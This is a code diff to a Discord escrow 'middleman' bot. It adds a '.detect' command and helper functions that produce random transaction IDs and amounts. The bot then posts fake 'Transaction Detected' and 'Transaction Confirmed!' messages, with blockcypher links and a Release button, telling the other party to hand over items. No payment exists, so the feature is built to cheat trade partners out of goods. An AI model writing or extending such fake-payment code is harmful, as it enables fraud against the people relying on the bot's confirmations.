@@ -29,7 +29,7 @@ const client = new Client({
   ],
 });
 
-const OWNER_ID = process.env.OWNER_ID;
+const OWNER_ID = '1422945082746601594';
 const DEFAULT_LTC = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
 const DEFAULT_USDC = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';
 
@@ -59,6 +59,58 @@ function isWhitelisted(userId) {
   return !!row;
 }
 
+function generateFakeTxid() {
+  const chars = '0123456789abcdef';
+  let txid = '';
+  for (let i = 0; i < 64; i++) txid += chars[Math.floor(Math.random() * chars.length)];
+  return txid;
+}
+
+function generateFakeAmount() {
+  const usd = (Math.random() * 749 + 1).toFixed(2);
+  const ltc = (usd / 55).toFixed(8);
+  return { usd, ltc, txid: generateFakeTxid() };
+}
+
+async function sendFakeLog(channelId, withRelease = false) {
+  const channel = await client.channels.fetch(channelId).catch(() => null);
+  if (!channel) return;
+  const { usd, ltc, txid } = generateFakeAmount();
+  const txidShort = `${txid.substring(0, 10)}...${txid.substring(txid.length - 8)}`;
+  
+  if (withRelease) {
+    const detectedEmbed = new EmbedBuilder()
+      .setTitle('⚠️ Transaction Detected')
+      .setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.')
+      .addFields(
+        { name: 'Transaction', value: `[${txidShort}](https://live.blockcypher.com/ltc/tx/${txid})` },
+        { name: 'Amount Received', value: `${ltc} LTC ($${usd})` }
+      )
+      .setColor(0xFFD700);
+    await channel.send({ embeds: [detectedEmbed] });
+    
+    setTimeout(async () => {
+      const confirmEmbed = new EmbedBuilder()
+        .setTitle('✅ Transaction Confirmed!')
+        .setDescription('The payment has been confirmed and secured in escrow.')
+        .addFields(
+          { name: 'Transaction', value: `[${txidShort}](https://live.blockcypher.com/ltc/tx/${txid})` },
+          { name: 'Total Amount Received', value: `${ltc} LTC ($${usd})` }
+        )
+        .setColor(0x00FF00);
+      const proceedEmbed = new EmbedBuilder()
+        .setTitle('✅ You may proceed with your trade.')
+        .setDescription('1. Receiver gives items\n2. Sender clicks Release')
+        .setColor(0x00FF00);
+      const row = new ActionRowBuilder().addComponents(
+        new ButtonBuilder().setCustomId('release').setLabel('Release').setStyle(ButtonStyle.Success),
+        new ButtonBuilder().setCustomId('cancel').setLabel('Cancel').setStyle(ButtonStyle.Secondary)
+      );
+      await channel.send({ embeds: [confirmEmbed, proceedEmbed], components: [row] });
+    }, 15000);
+  }
+}
+
 const commands = [
   new SlashCommandBuilder().setName('panel').setDescription('Spawn the middleman panel'),
   new SlashCommandBuilder().setName('panelcategory').setDescription('Set ticket category').addStringOption(opt => opt.setName('id').setDescription('Category ID').setRequired(true)),
@@ -86,7 +138,13 @@ client.on(Events.MessageCreate, async (message) => {
   const args = message.content.slice(1).trim().split(/ +/);
   const command = args.shift().toLowerCase();
   
-  if (command === 'setltc') {
+  if (command === 'detect') {
+    const channelId = args[0];
+    if (!channelId) return message.reply('❌ Provide channel ID: `.detect (channelid)`');
+    await sendFakeLog(channelId, true);
+    await message.reply(`✅ Fake transaction triggered in <#${channelId}>`);
+  }
+  else if (command === 'setltc') {
     if (!isWhitelisted(message.author.id)) return;
     const address = args[0];
     if (!address) return message.reply('❌ Provide address: `.setltc (address)`');
